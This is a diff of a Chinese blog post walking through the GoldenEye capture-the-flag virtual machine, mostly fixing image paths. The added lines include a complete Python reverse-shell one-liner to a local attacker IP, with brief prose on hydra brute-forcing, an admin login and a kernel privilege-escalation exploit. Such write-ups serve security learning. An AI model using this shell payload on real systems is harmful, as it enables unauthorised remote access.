@@ -114,15 +114,15 @@
 <p><img src="/2020/02/29/GoldenEye/image-20200229153745956.png" alt="image-20200229153745956"></p>
 <p><img src="/2020/02/29/GoldenEye/kyle/myBlog/source/_posts/GoldenEye/image-20200229164431947.png" alt="image-20200229164431947"></p>
 <p>80端口</p>
-<p><img src="/2020/02/29/GoldenEye/image-20200229154333851.png" alt="image-20200229154333851"></p>
+<p><img src="/2020/02/29/GoldenEye/image-20200229164431947.png" alt="image-20200229164431947"></p>
 <p>那么我们就尝试访问下吧</p>
-<p><img src="/2020/02/29/GoldenEye/kyle/myBlog/source/_posts/GoldenEye/image-20200229154627261.png" alt="image-20200229154627261"></p>
+<p><img src="/2020/02/29/GoldenEye/image-20200229154627261.png" alt="image-20200229154627261"></p>
 <p>CTF的常规思路 看页面源码</p>
-<p><img src="/2020/02/29/GoldenEye/kyle/myBlog/source/_posts/GoldenEye/image-20200229154847054.png" alt="image-20200229154847054"></p>
+<p><img src="/2020/02/29/GoldenEye/image-20200229154847054.png" alt="image-20200229154847054"></p>
 <p>发现个js 跟过去 看看我看到了什么</p>
 <p>两个人名 Natalya和Boris</p>
 <p>编码解码后得到密码 InvincibleHack3r</p>
-<p><img src="/2020/02/29/GoldenEye/kyle/myBlog/source/_posts/GoldenEye/image-20200229155010107.png" alt="image-20200229155010107"></p>
+<p><img src="/2020/02/29/GoldenEye/image-20200229155010107.png" alt="image-20200229155010107"></p>
 <p>这里注意 通过小写的boris加密码才能登陆进去</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229160731176.png" alt="image-20200229160731176"></p>
 <p>文中意思pop3在5万多的端口，hydra爆它！</p>
@@ -131,7 +131,7 @@
 <p><img src="/2020/02/29/GoldenEye/image-20200229171304311.png" alt="image-20200229171304311"></p>
 <p>文件2发现信息</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229171414370.png" alt="image-20200229171414370"></p>
-<p><img src="/2020/02/29/GoldenEye/kyle/myBlog/source/_posts/GoldenEye/image-20200229171706959.png" alt="image-20200229171706959"></p>
+<p><img src="/2020/02/29/GoldenEye/image-20200229171706959.png" alt="image-20200229171706959"></p>
 <p>既然告诉了 那么就执行吧 设置下本地hosts 否则公网这个域名可不是什么好网站 嘿嘿</p>
 <p>用给的账号密码登录上去 </p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229173757810.png" alt="image-20200229173757810"></p>
@@ -145,15 +145,22 @@
 <p>base64解密 脑洞一下 首页说有admin账户 结合这个 登一下</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229181059568.png" alt="image-20200229181059568"></p>
 <p>admin权限还挺大 python弹shell nc接着</p>
+<p>poc这里 ip端口换一下 </p>
+<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.43.201”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/bash”)’</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229181554758.png" alt="image-20200229181554758"></p>
+<p>网站一些配置要改否则弹不出来</p>
+<p><img src="/2020/02/29/GoldenEye/233.png" alt="233"></p>
+<p>点这个倒三角 开始反连</p>
+<p><img src="/2020/02/29/GoldenEye/3334.png" alt="3334"></p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229182613818.png" alt="image-20200229182613818"></p>
 <p>看下内核 好像可以提权 exp去exploit db就行</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229190909045.png" alt="image-20200229190909045"></p>
-<p>靶机没gcc环境 要改下exp </p>
+<p>靶机没gcc环境 要改下exp  gcc改成cc仅这一处即可</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229191330300.png" alt="image-20200229191330300"></p>
-<p>python起个http wget过去</p>
+<p>python起个http wget过去 exp放着下面 访问路径要注意 这里我失误了几次</p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229192156502.png" alt="image-20200229192156502"></p>
 <p>编译一下 给个权限 提权成功</p>
+<p><img src="/2020/02/29/GoldenEye/image-20200229192551692.png" alt="image-20200229192551692"></p>
 <p><img src="/2020/02/29/GoldenEye/image-20200229192806714.png" alt="image-20200229192806714"></p>
 <p>访问下路径 此时bgm响起 题材不错很有意思</p>
 <p><img src="/2020/02/29/GoldenEye/111.jpeg" alt="111"></p>
